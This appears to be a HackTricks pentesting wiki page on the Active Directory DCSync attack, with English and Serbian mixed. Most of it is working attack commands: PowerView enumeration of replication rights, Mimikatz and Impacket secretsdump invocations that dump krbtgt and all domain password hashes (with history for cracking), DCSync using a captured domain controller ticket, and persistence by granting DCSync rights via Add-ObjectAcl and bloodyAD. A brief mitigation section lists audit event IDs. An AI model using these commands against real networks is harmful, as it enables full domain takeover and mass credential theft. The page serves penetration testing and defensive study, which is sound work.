# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

The **DCSync** permission implies having these permissions over the domain itself: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** and **Replicating Directory Changes In Filtered Set**.

**Important Notes about DCSync:**

- The **DCSync attack simulates the behavior of a Domain Controller and asks other Domain Controllers to replicate information** using the Directory Replication Service Remote Protocol (MS-DRSR). Because MS-DRSR is a valid and necessary function of Active Directory, it cannot be turned off or disabled.
- By default only **Domain Admins, Enterprise Admins, Administrators, and Domain Controllers** groups have the required privileges.
- In practice, **full DCSync** needs **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** on the domain naming context. `DS-Replication-Get-Changes-In-Filtered-Set` is commonly delegated together with them, but on its own it is more relevant for syncing **confidential / RODC-filtered attributes** (for example legacy LAPS-style secrets) than for a full krbtgt dump.
- If any account passwords are stored with reversible encryption, an option is available in Mimikatz to return the password in clear text

### Enumeration

Check who has these permissions using `powerview`:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
Ako želite da se fokusirate na **non-default principals** sa DCSync pravima, filtrirajte ugrađene replication-capable grupe i pregledajte samo neočekivane trustees:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Exploit Localno
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Eksploatiši udaljeno
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Praktični primeri sa obuhvatom:
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync using a captured DC machine TGT (ccache)

U scenarijima export-mode sa unconstrained-delegation, možete capture-ovati Domain Controller machine TGT (npr. `DC1$@DOMAIN` za `krbtgt@DOMAIN`). Zatim možete koristiti taj ccache za autentikaciju kao DC i izvršiti DCSync bez lozinke.
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Operativne beleške:

- **Impacket-ova Kerberos putanja prvo dodiruje SMB** pre DRSUAPI poziva. Ako okruženje nameće **SPN target name validation**, kompletan dump može da zakaže sa `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- U tom slučaju, ili prvo zatraži **`cifs/<dc>`** service ticket za ciljni DC ili se vrati na **`-just-dc-user`** za nalog koji ti odmah treba.
- Kada imaš samo niža replication prava, LDAP/DirSync-style syncing i dalje može da otkrije **confidential** ili **RODC-filtered** atribute (na primer legacy `ms-Mcs-AdmPwd`) bez punog krbtgt replication.

`-just-dc` generiše 3 fajla:

- jedan sa **NTLM hashes**
- jedan sa **Kerberos keys**
- jedan sa cleartext passwords iz NTDS za sve naloge kojima je uključeno [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Možeš da dobiješ korisnike sa reversible encryption pomoću

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

Ako si domain admin, možeš da dodeliš ove permissions bilo kom useru uz pomoć `powerview`:
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Linux operateri mogu da urade isto sa `bloodyAD`:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Then, you can **proverite da li je korisniku ispravno dodeljeno** 3 privilegije tražeći ih u izlazu od (trebalo bi da možete da vidite nazive privilegija unutar polja "ObjectType"):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Ublažavanje

- Security Event ID 4662 (Audit Policy for object mora biti omogućen) – Izvršena je operacija nad objektom
- Security Event ID 5136 (Audit Policy for object mora biti omogućen) – Izmenjen je objekat directory service-a
- Security Event ID 4670 (Audit Policy for object mora biti omogućen) – Promenjene su dozvole nad objektom
- AD ACL Scanner - Kreirajte i uporedite create izveštaje ACL-ova. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [https://github.com/fortra/impacket/blob/master/ChangeLog.md](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [https://simondotsh.com/infosec/2022/07/11/dirsync.html](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)
- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html

{{#include ../../banners/hacktricks-training.md}}
